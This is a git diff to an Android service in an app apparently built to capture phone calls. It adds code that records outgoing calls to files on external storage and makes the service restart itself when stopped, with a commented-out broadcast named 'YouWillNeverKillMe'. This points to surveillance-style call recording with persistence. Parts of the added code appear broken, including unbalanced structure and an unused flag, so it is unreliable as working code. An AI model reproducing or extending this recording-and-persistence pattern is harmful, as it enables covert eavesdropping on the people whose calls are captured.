@@ -1,5 +1,7 @@
 package com.postal.omniscient.postal.catchPhone.Call;
 
+import android.app.ActivityManager;
+import android.app.Notification;
 import android.app.Service;
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -9,10 +11,12 @@ import android.media.MediaRecorder;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.IBinder;
+import android.support.v4.content.AsyncTaskLoader;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
 
+import com.postal.omniscient.postal.service.MyService;
 import com.postal.omniscient.postal.service.StartService;
 
 import java.io.File;
@@ -55,13 +59,14 @@ public class TService extends Service {
 
     @Override
     public void onDestroy() {
-        Log.d("TAG", "destroy");
+        Log.d("MyMsg", "destroy");
 
         super.onDestroy();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
+
         // final String terminate =(String)
         // intent.getExtras().get("terminate");//
         // intent.getStringExtra("terminate");
@@ -82,10 +87,12 @@ public class TService extends Service {
         this.br_call = new CallBr();
         this.registerReceiver(this.br_call, filter);
 
+
+
         // if(terminate != null) {
         // stopSelf();
         // }
-        return START_NOT_STICKY;//_REDELIVER_INTENT;
+        return START_STICKY;//_REDELIVER_INTENT;
     }
 
     public class CallBr extends BroadcastReceiver {
@@ -152,14 +159,101 @@ public class TService extends Service {
                 if ((bundle = intent.getExtras()) != null) {
                     outCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
                     Toast.makeText(context, "OUT : " + outCall, Toast.LENGTH_LONG).show();
+                    ////////////////////////////////////////////////////////////
 
+                            String out = new SimpleDateFormat("dd-MM-yyyy hh-mm-ss").format(new Date());
+                            File sampleDir = new File(Environment.getExternalStorageDirectory(), "/Trd1");
+                            if (!sampleDir.exists()) {
+                                sampleDir.mkdirs();
+                            }
+                            String file_name = "Record";
+                            try {
+                                audiofile = File.createTempFile(file_name, "postal.amr", sampleDir);
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                            String path = Environment.getExternalStorageDirectory().getAbsolutePath();
 
-                }
-            }
+                            recorder = new MediaRecorder();
+//                          recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
+
+                            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
+                            recorder.setOutputFormat(MediaRecorder.OutputFormat.AMR_NB);
+                            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+                            recorder.setOutputFile(audiofile.getAbsolutePath());
+                            try {
+                                recorder.prepare();
+                            } catch (IllegalStateException e) {
+                                e.printStackTrace();
+                            } catch (IOException e) {
+                                e.printStackTrace();
+                            }
+                            recorder.start();
+                            recordstarted = true;
+                        }
+                    } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
+
+                        Toast.makeText(context, "REJECT || DISCO", Toast.LENGTH_LONG).show();
+                        Log.i("MyMsg", "call off");
+                        if (recordstarted) {
+                            recorder.stop();
+                            recordstarted = false;
+                        }
+                    }
+
+            AsyncR ad = new AsyncR(context);
+            ad.forceLoad();
+                    ///////////////////////////////////////////////////////////
+
             // ALGA
-            Intent par = new Intent(getApplicationContext(), StartService.class);
-            startService(par);
+//            Intent par = new Intent(getApplicationContext(), MyService.class);
+//            startService(par);
+
+            boolean flag = true;
+            ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
+            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
+                if (MyService.class.getName().equals(service.service.getClassName())) {
+                   // Log.i("MyMsg", "рабочий");
+                    flag = false;
+                }
+               // Log.i("MyMsg", " не ребочий");
+
+        }
+
+
+        }
+        public class AsyncR extends AsyncTaskLoader {
+
+
+            public AsyncR(Context context) {
+                super(context);
+
+            }
+            Toast toast;
+            public AsyncR(Context applicationContext, Toast toast) {
+                super(applicationContext);
+                this.toast = toast;
+            }
+
+            @Override
+            public Object loadInBackground() {
+
+                long sec = 1000 * 20;
+                try {
+                    // while(true) {
+                    //Thread.sleep(sec);
+
+                    Log.i("MyMsg", "PotoCCCC");
+                    //}
+                } catch (Exception e) {
+                    Log.e("MyMsg","2"+ e.toString());
+                }
+
+                Intent par = new Intent(getContext(), StartService.class);
+                getContext().startService(par);
+                //getContext().sendBroadcast(new Intent("YouWillNeverKillMe"));
+                return null;
+            }
         }
     }
-
 }
